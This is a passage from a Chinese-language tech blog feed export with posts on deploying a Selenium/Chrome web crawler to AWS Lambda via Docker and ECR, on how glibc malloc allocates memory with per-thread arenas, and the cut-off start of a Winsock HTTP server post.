class="string">&#x27;--disable-features=AudioServiceOutOfProcess&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-hang-monitor&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-ipc-flooding-protection&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-notifications&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-offer-store-unmasked-wallet-cards&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-popup-blocking&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-print-preview&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-prompt-on-repost&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-renderer-backgrounding&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-speech-api&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-sync&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disk-cache-size=33554432&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--hide-scrollbars&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--ignore-gpu-blacklist&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--ignore-certificate-errors&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--metrics-recording-only&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--mute-audio&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-default-browser-check&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-first-run&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-pings&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-zygote&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--password-store=basic&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--use-gl=swiftshader&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--use-mock-keychain&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--single-process&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--user-data-dir=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp/user-data&#x27;</span>))</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--data-path=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp/data-path&#x27;</span>))</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--homedir=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp&#x27;</span>))</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disk-cache-dir=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp/cache-dir&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">    driver = webdriver.Chrome(</span><br><span class="line">        executable_path=<span class="string">&#x27;/usr/bin/chromedriver&#x27;</span>,</span><br><span class="line">        options=chrome_options)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> driver:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Selenium Driver Initiated&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    response = &#123;</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: json.dumps(html, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim Dockerfile</span><br></pre></td></tr></table></figure><p>Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Define global args</span></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR=<span class="string">&quot;/home/app/&quot;</span></span><br><span class="line"><span class="keyword">ARG</span> RUNTIME_VERSION=<span class="string">&quot;3.9&quot;</span></span><br><span class="line"><span class="keyword">ARG</span> DISTRO_VERSION=<span class="string">&quot;3.12&quot;</span></span><br><span class="line"><span class="comment"># Stage 1</span></span><br><span class="line"><span class="keyword">FROM</span> python:$&#123;RUNTIME_VERSION&#125;-alpine$&#123;DISTRO_VERSION&#125; AS python-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add --no-cache \</span></span><br><span class="line"><span class="language-bash">    libstdc++</span></span><br><span class="line"><span class="comment"># Stage 2</span></span><br><span class="line"><span class="keyword">FROM</span> python-alpine AS build-image</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add --no-cache \</span></span><br><span class="line"><span class="language-bash">    build-base \</span></span><br><span class="line"><span class="language-bash">    libtool \</span></span><br><span class="line"><span class="language-bash">    autoconf \</span></span><br><span class="line"><span class="language-bash">    automake \</span></span><br><span class="line"><span class="language-bash">    libexecinfo-dev \</span></span><br><span class="line"><span class="language-bash">    make \</span></span><br><span class="line"><span class="language-bash">    cmake \</span></span><br><span class="line"><span class="language-bash">    libcurl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR</span><br><span class="line"><span class="keyword">ARG</span> RUNTIME_VERSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python<span class="variable">$&#123;RUNTIME_VERSION&#125;</span> -m pip install awslambdaric --target <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 3</span></span><br><span class="line"><span class="keyword">FROM</span> python-alpine as build-image2</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build-image <span class="variable">$&#123;FUNCTION_DIR&#125;</span> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apk add gcc python3-dev musl-dev \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apk add jpeg-dev zlib-dev libjpeg-turbo-dev</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python<span class="variable">$&#123;RUNTIME_VERSION&#125;</span> -m pip install -r requirements.txt --target <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"><span class="comment"># Stage 4</span></span><br><span class="line"><span class="keyword">FROM</span> python-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build-image2 <span class="variable">$&#123;FUNCTION_DIR&#125;</span> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add jpeg-dev zlib-dev libjpeg-turbo-dev \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apk add chromium chromium-chromedriver</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> https://github.com/aws/aws-lambda-runtime-interface-emulator/releases/latest/download/aws-lambda-rie /usr/bin/aws-lambda-rie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 755 /usr/bin/aws-lambda-rie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app/* <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> entry.sh /</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [ <span class="string">&quot;/entry.sh&quot;</span> ]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;app.handler&quot;</span> ]</span></span><br></pre></td></tr></table></figure><p>建構 Image</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t awsLambdacrawler .</span><br></pre></td></tr></table></figure><p>一但建構完成後可以透過指令查看是否建構成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h2 id="測試容器"><a href="#測試容器" class="headerlink" title="測試容器"></a>測試容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 9000:8080 &lt;IMAGE_ID&gt;</span><br></pre></td></tr></table></figure><p>輸出結果會像是這樣<br><img src="https://i.imgur.com/QlxN5Cu.jpg" alt="Imgur"></p><p>此時可以再開一個 Terminal 來去 invoke 看看請求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST &quot;http://localhost:9000/2015-03-31/functions/function/invocations&quot; -d &#x27;&#123;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ciclBUc.jpg" alt="Imgur"></p><p>接著去建立 <strong>ECR Repository</strong>（在 Local Macbook）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr create-repository --repository-name cx-lambda --image-scanning-configuration scanOnPush=true</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag awsLambdacrawler:latest &lt;ENTER YOUR CONTAINER REPOSITORY URI&gt;:latest</span><br></pre></td></tr></table></figure><p>接著我在 Local Macbook 查看 ECR 密碼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr get-login-password </span><br></pre></td></tr></table></figure><p>將密碼複製起來</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker login &lt;YOUR AWS ACCOUNT ID&gt;.dkr.ecr.&lt;YOUR REGION&gt;.amazonaws.com (http://amazonaws.com/)&gt;</span><br></pre></td></tr></table></figure><ul><li>username: AWS</li><li>password:  剛剛複製的密碼</li></ul><p>將 Image 推上 Repository</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push  &lt;YOUR AWS ACCOUNT ID&gt;.dkr.ecr.&lt;YOUR REGION&gt;.amazonaws.com (http://amazonaws.com/)</span><br></pre></td></tr></table></figure><p>可以去 ECR Console 上查看<br><img src="https://i.imgur.com/mBqWiCX.jpg" alt="Imgur"></p><h2 id="建立-Lambda"><a href="#建立-Lambda" class="headerlink" title="建立 Lambda"></a>建立 Lambda</h2><p>去 Lambda Console &gt; Create Function &gt; Container Image</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function Name: ScrappingfromImage</span><br><span class="line">Container image URI: 125657041963.dkr.ecr.us-east-1.amazonaws.com/cx-lambda:latest</span><br></pre></td></tr></table></figure><h3 id="設定-Lambda-網路存取"><a href="#設定-Lambda-網路存取" class="headerlink" title="設定 Lambda  網路存取"></a>設定 Lambda  網路存取</h3><p>若想要 Lambda Function 連接到外部網路，不同於EC2，你需要將 Lambda attach 到你自己的 VPC，並且需要把 Lambda 放到 private gateway，並且該 Private Gateway 必須要設定路由表中的預設路由到一個 <strong>NAT Gateway</strong>。<br>因為 Lambda 在連接到某個 VPC時會去建立一個 ENI，那個ENI預設只吃 Priavte IP，因此會需要一個 NAT Gateway 來進行公有私有IP的轉換，並且會透過一個叫 V2N 的功能來去連接到 NAT Gateway。</p><blockquote><p>有興趣的話可以參考這兩份官方文件，裡面對 Lambda 的聯網機制有詳細介紹<br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/foundation-networking.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/foundation-networking.html</a><br><a href="https://aws.amazon.com/tw/blogs/compute/announcing-improved-vpc-networking-for-aws-lambda-functions/">https://aws.amazon.com/tw/blogs/compute/announcing-improved-vpc-networking-for-aws-lambda-functions/</a></p></blockquote><p>這邊用流程圖展示的話會是這樣:</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  flowchart LR    subgraph Custom VPC        direction LR        c1(Lambda) ---&gt; a2(NATGateway)        subgraph Public Subnet            direction LR            a2(NATGateway)        end        subgraph Private Subnet            direction LR            c1(Lambda)        end    end  </pre></div><p><img src="https://i.imgur.com/7suZcAG.jpg" alt="Imgur"></p><p>private route<br><img src="https://i.imgur.com/DAMgy23.jpg" alt="Imgur"></p><h3 id="設定-Lambda-Permission"><a href="#設定-Lambda-Permission" class="headerlink" title="設定 Lambda Permission"></a>設定 Lambda Permission</h3><p>要記得幫 Lambda 添加 <code>VPCAccessExecutionRole</code> 這個 Permission</p><p>接著就是測試 code</p><p>但可以先去 Configuration &gt; General Configuration &gt; Timeout  把 timeout 調高</p><blockquote><p>Timeout: 20 sec</p></blockquote><h2 id="測試-Lambda"><a href="#測試-Lambda" class="headerlink" title="測試 Lambda"></a>測試 Lambda</h2><p><img src="https://i.imgur.com/fVsALwS.jpg" alt="Imgur"></p><p>成功</p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Amazon </tag>
            
            <tag> Lambda </tag>
            
            <tag> 網頁爬蟲 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇文章</title>
      <link href="/posts/7a776471.html"/>
      <url>/posts/7a776471.html</url>
      
        <content type="html"><![CDATA[<h1 id="從-Hugo-移植到-Hexo"><a href="#從-Hugo-移植到-Hexo" class="headerlink" title="從 Hugo 移植到 Hexo"></a>從 Hugo 移植到 Hexo</h1><p>之前在 Hugo 雖然就挺方便的，但這個 Butterfly 主題真的太贊了，就先移植過來玩看看</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>🗃️Deep Dive: malloc 函式如何進行記憶體分配</title>
      <link href="/posts/78d9b0c6.html"/>
      <url>/posts/78d9b0c6.html</url>
      
        <content type="html"><![CDATA[<h1 id="Deep-Dive-malloc-函式如何進行記憶體分配"><a href="#Deep-Dive-malloc-函式如何進行記憶體分配" class="headerlink" title="Deep Dive: malloc 函式如何進行記憶體分配?"></a>Deep Dive: malloc 函式如何進行記憶體分配?</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>動態記憶體配置是一個重要的概念。它讓程式可以在執行期間根據需要動態地分配和釋放記憶體，而不必依賴於事先靜態分配的記憶體區塊。這樣的彈性使程式能夠更有效地利用記憶體資源，並處理各種大小和複雜性的問題。</p><p>C語言中的malloc函式是一個廣泛使用的動態記憶體分配函式。它允許程式設計師在執行期間動態地分配指定大小的記憶體區塊。malloc的一個重要特性是它能夠確保分配的記憶體區塊在使用期間是有效和可存取的，同時適當地釋放它們以避免記憶體洩漏。</p><p>然而，你或許好奇malloc函式在底層是如何實現記憶體分配的，要如何準確動態分配空出的記憶體給caller?。這就是我們將在本文中深入探討的主題。我們將著重於malloc函式的底層實現，特別是當我們呼叫malloc時，系統如何決定和分配一塊合適的記憶體位址給我們使用。</p><p>在探討這個問題之前，讓我們先回顧一下動態記憶體配置的基本概念。在C語言中，我們可以使用malloc函式來動態地分配記憶體。它的函式原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p>malloc函式接受一個正整數參數size，代表我們希望分配的記憶體區塊大小（以位元組為單位）。它會嘗試找到一塊足夠大的連續記憶體區塊，並將其標記為已分配。如果成功找到一塊合適的記憶體區塊，malloc函式將返回指向該區塊開頭的指標；否則，它將返回NULL表示分配失敗。</p><p>雖然malloc函式看起來相對簡單，但其底層的實現是一個複雜的任務。不同的作業系統和編譯器可能使用不同的演算法和策略來執行記憶體分配。因此，我們將深入研究這些內部機制，以了解malloc函式是如何進行記憶體分配的，並探討其優缺點及效能影響。</p><p>接下來，我們將進入malloc函式的底層世界，一同揭開它背後的神秘面紗。我們將探討幾種常見的記憶體分配演算法，包括固定分割、動態分割以及頁面分割等等。這些演算法將幫助我們更好地理解malloc函式的工作方式，並瞭解如何優化記憶體使用效能。</p><p><img src="https://i.imgur.com/8lB2IrU.png"></p><p>隨著這個問題我們可以深入挖掘它的原理</p><h2 id="如何進行記憶體分配"><a href="#如何進行記憶體分配" class="headerlink" title="如何進行記憶體分配"></a>如何進行記憶體分配</h2><p>作業系統中的記憶體分配功能主要是靠記憶體分配器(Memory Allocator) 來實現，在早期glibc預設的記憶體分配器是 <code>dlmalloc</code></p><p>但<code>dlmalloc</code> 有個問題，一旦有多個Thread呼叫Malloc，只能有一個Thread可以進入Critical Section。而改進這個問題的就是從<code>dlmalloc</code>中fork出來的<code>ptmalloc2</code>，一旦多個Thread呼叫malloc，則會立即分配記憶體給個別Thread。</p><p>由於記憶體分配的任務基本上是會存在於多個Thread之間，因此<code>dlmalloc</code>很容易造成效能低落。在<code>ptmalloc2</code>中，多個Thread同時呼叫malloc時，記憶體會被立刻分配，因為每個Thread會維護單獨的堆疊區段，而維護每個堆疊區段的freelist 資料結構也同樣是個別獨立的。</p><p>這種維護個別freelist結構以及heap區段的行為叫做 <strong>per thread areana</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="type">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="type">char</span>* addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">pthread_t</span> t1;</span><br><span class="line">        <span class="type">void</span>* s;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        <span class="type">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,<span class="built_in">getpid</span>());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        ret = <span class="built_in">pthread_create</span>(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = <span class="built_in">pthread_join</span>(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>編譯並執行程式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c mythread -lpthread -o mythread</span><br><span class="line"></span><br><span class="line">./mythread</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/qeTHI16.png"></p><p>可以根據PID來查看行程的記憶體分配狀況<br>根據上面程式輸出提示其PID為74</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/PID/maps</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ScQz515.png"></p><p>可以觀察到Heap區段是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">55590b2c9000-55590b2ea000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fd7ddf25000-7fd7ddf28000 rw-p 00000000 00:00 0</span><br></pre></td></tr></table></figure><p>當呼叫malloc後，再次查看記憶體分配的情況</p><p><img src="https://i.imgur.com/yy06ND6.png"></p><p><img src="https://i.imgur.com/WpwRXFs.png"></p><p>我們可以發現free完後，所分配到的記憶體並不會馬上釋放，其實會先將記憶體區域釋放給<strong>glibc malloc library</strong>，這邊釋放的記憶體區塊(<strong>Chunk</strong>)會加入到main arenas bin (在glibc malloc中，freelist被稱為bin)，接著如果使用者請求分配新的記憶體區快，malloc就不會去kernel請求新的記憶體區快，而是去bin中找空的區塊(Free chunk)，若bin中沒有可用區塊才會再去跟kernel請求。</p><p><img src="https://i.imgur.com/ixhdaI2.png"></p><p><img src="https://i.imgur.com/43OePVQ.png"></p><div class="note info flat"><p>至於後續的文章會進一步去分析: 使用哪種System Call?</p><ul><li>mmap</li><li>brk</li></ul></div><p><img src="https://i.imgur.com/aLNmaSG.png"></p><h2 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h2><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a><br><a href="https://hanfeng.ink/post/understand_glibc_malloc/">https://hanfeng.ink/post/understand_glibc_malloc/</a><br><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></p>]]></content>
      
      
      <categories>
          
          <category> Deep Dive </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🧪透過 Winsock 依序堆疊出一個HTTP Server</title>
      <link href="/posts/34f1f1b8.html"/>
      <url>/posts/34f1f1b8.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/dcWHOfV.png"></p><p>主要想實做看看在Windows環境下透過Winsocks來建立網路層的Socket並且去進行應用層的協定解析，使用程式語言為C語言，平台則是使用VSCode，本次的學習方式是透過最近很火紅的 <a href="https://chat.openai.com/">ChatGPT</a> 來進行學習，並再自行Debug和研究語法。</p><h2 id="範例程式碼"><a href="#範例程式碼" class="headerlink" title="範例程式碼"></a>範例程式碼</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 